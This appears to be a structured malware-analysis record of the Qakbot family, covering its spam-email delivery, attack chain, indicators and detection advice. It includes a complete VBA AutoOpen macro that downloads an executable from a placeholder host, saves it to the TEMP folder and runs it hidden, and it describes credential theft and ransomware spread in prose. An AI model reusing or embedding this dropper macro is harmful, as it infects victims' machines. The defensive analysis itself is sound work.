package_info.package_manager: malware distribution via spam email (not a software package manager)
package_info.package_versions: Active since at least 2008; multiple variants over time
package_info.why_malicious: Qakbot is a long-running malware family distributed via spam emails with malicious attachments and links. It is used for credential theft, lateral movement, and as a platform for ransomware deployment, impacting hundreds of thousands of systems globally.

execution_context.trigger: runtime (after user opens malicious attachment or link)
execution_context.file_location: malicious email attachment (macro-enabled document or executable)

malicious_snippets.code_snippet:
Sub AutoOpen()
  Dim objXML As Object
  Set objXML = CreateObject("MSXML2.XMLHTTP")
  objXML.Open "GET", "http://malicious-domain.com/payload.exe", False
  objXML.Send
  If objXML.Status = 200 Then
    Dim objStream As Object
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write objXML.responseBody
    objStream.SaveToFile Environ("TEMP") & "\payload.exe", 2
    objStream.Close
    Shell Environ("TEMP") & "\payload.exe", vbHide
  End If
End Sub
malicious_snippets.code_behavior: At document open (import-time), the macro downloads an executable from a remote server, writes it to disk, and executes it, resulting in initial malware infection.

malice_analysis.why_suspicious: Macros that download and execute remote binaries are a classic malware delivery technique.
malice_analysis.violated_expectations: Normal document macros should not perform network operations or execute binaries.
malice_analysis.similar_legitimate_use: Automated document processing in trusted environments (rare).
key_indicators: Use of MSXML2.XMLHTTP for network requests
Saving and executing files from the TEMP directory

execution_context.file_location: payload.exe (Qakbot main binary, dropped to TEMP directory)

malicious_snippets.code_behavior: At runtime, the malware steals browser and Outlook credentials, exfiltrates them to a remote C2 server, and establishes persistence via registry modification.

malice_analysis.why_suspicious: Stealing credentials and exfiltrating them to remote servers is a hallmark of info-stealing malware.
malice_analysis.violated_expectations: Legitimate software should not access or transmit user credentials without consent.
malice_analysis.similar_legitimate_use: Enterprise credential backup tools (with user consent and secure storage).

execution_context.trigger: runtime (post-infection lateral movement and ransomware deployment)
execution_context.file_location: Qakbot process memory (injected code or downloaded modules)

malicious_snippets.code_behavior: At runtime, the malware enumerates network hosts, copies ransomware payloads to accessible systems, and remotely executes them, enabling mass ransomware deployment.

malice_analysis.why_suspicious: Automated lateral movement and remote ransomware execution are highly malicious behaviors.
malice_analysis.violated_expectations: Normal software should not propagate or execute ransomware across a network.
malice_analysis.similar_legitimate_use: Enterprise software deployment tools (with strict controls and logging).

attack_chain.action: User receives spam email with malicious attachment or link; opens document triggering macro execution.
attack_chain.leads_to: Initial malware payload is downloaded and executed.

attack_chain.action: Qakbot payload executes, steals credentials, exfiltrates data, and establishes persistence.
attack_chain.leads_to: Attacker gains foothold and ongoing access to the system.

attack_chain.action: Qakbot enumerates network, moves laterally, and deploys ransomware or additional payloads.
attack_chain.leads_to: Mass ransomware deployment or further compromise of networked systems.

behavioral_signatures: Document macros that download and execute remote binaries
Credential dumping and exfiltration to external servers
Network host enumeration and remote payload deployment
file_indicators: Executables dropped to TEMP or AppData directories (e.g., qakbot.exe, payload.exe)
network_indicators: Outbound connections to known Qakbot C2 domains/IPs
Unusual HTTPS POST requests to external servers after document open
Connections to internal hosts for lateral movement
detection_knowledge.how_to_detect: Monitor for Office documents with macros that perform network operations or drop executables. Detect credential dumping activity and unauthorized registry modifications for persistence. Watch for outbound connections to known Qakbot C2 infrastructure and lateral movement behaviors such as remote code execution or file transfers to other hosts.
